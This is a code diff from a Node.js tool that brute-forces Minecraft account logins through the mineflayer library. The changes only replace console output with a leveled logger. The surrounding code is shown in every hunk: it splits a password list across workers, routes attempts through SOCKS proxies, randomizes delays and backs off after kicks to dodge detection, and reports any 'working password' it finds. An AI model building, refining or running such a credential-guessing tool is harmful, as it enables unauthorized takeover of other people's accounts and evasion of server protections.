@@ -99,7 +99,7 @@ const allPasswords = fs.readFileSync('passwords.txt', 'utf8')
 // Distribute passwords among workers
 const passwords = allPasswords.filter((_, idx) => idx % workerCount === workerId);
 
-console.log(`Worker #${workerId}: Processing ${passwords.length} of ${allPasswords.length} passwords`);
+log(`Worker #${workerId}: Processing ${passwords.length} of ${allPasswords.length} passwords`, 'INFO');
 
 // Create logs directory if it doesn't exist
 if (!fs.existsSync('logs')) {
@@ -316,7 +316,7 @@ async function tryPassword(username, password, proxyUri) {
         botConfig.agent = new SocksProxyAgent(proxyUri);
     }
 
-    console.log('[DEBUG] Bot configuration:', JSON.stringify(botConfig, null, 2));
+    log(`Bot configuration: ${JSON.stringify(botConfig, null, 2)}`, 'DEBUG');
 
     try {
         const bot = mineflayer.createBot(botConfig);
@@ -335,19 +335,19 @@ async function tryPassword(username, password, proxyUri) {
 
             bot.once('error', (err) => {
                 clearTimeout(timeout);
-                console.log('[ERROR] Bot error:', err.message);
+                log(`Bot error: ${err.message}`, 'ERROR');
                 resolve('error');
             });
 
             bot.once('kicked', (reason) => {
                 clearTimeout(timeout);
-                console.log('[INFO] Bot kicked:', reason);
+                log(`Bot kicked: ${reason}`, 'INFO');
                 resolve('kicked');
             });
         });
     } catch (err) {
-        console.log('[ERROR] Error creating bot:', err.message);
-        console.log('[ERROR] Stack trace:', err.stack);
+        log(`Error creating bot: ${err.message}`, 'ERROR');
+        log(`Stack trace: ${err.stack}`, 'ERROR');
         return 'error';
     }
 }
@@ -390,17 +390,17 @@ async function main() {
             state.successfulLogins++;
             state.accountStates[account.username].consecutiveFailures = 0;
             saveState();
-            console.log('\nFound working password:', password);
+            log(`\nFound working password: ${password}`, 'SUCCESS');
             break;
         } else {
             state.failedLogins++;
             state.accountStates[account.username].consecutiveFailures++;
 
             if (result === 'kicked') {
-                console.log('Too many accounts detected, waiting for session timeout...');
+                log('Too many accounts detected, waiting for session timeout...', 'WARN');
                 // Increase wait time based on consecutive failures
                 const waitTime = config.sessionTimeout + (state.accountStates[account.username].consecutiveFailures * 60000); // Add 1 minute per failure
-                console.log(`Waiting ${(waitTime/1000).toFixed(1)} seconds (increased due to consecutive failures)...`);
+                log(`Waiting ${(waitTime/1000).toFixed(1)} seconds (increased due to consecutive failures)...`, 'WAIT');
                 await new Promise(resolve => setTimeout(resolve, waitTime));
                 state.accountStates[account.username].lastSessionEnd = Date.now();
                 state.currentAttempt--; // Retry the same password after waiting
@@ -413,7 +413,7 @@ async function main() {
             // Add randomization to delay
             const baseDelay = config.delayBetweenAttempts.min;
             const randomDelay = baseDelay + Math.random() * (config.delayBetweenAttempts.max - baseDelay);
-            console.log(`Waiting ${(randomDelay/1000).toFixed(1)} seconds before next attempt...`);
+            log(`Waiting ${(randomDelay/1000).toFixed(1)} seconds before next attempt...`, 'WAIT');
             await new Promise(resolve => setTimeout(resolve, randomDelay));
         }
         
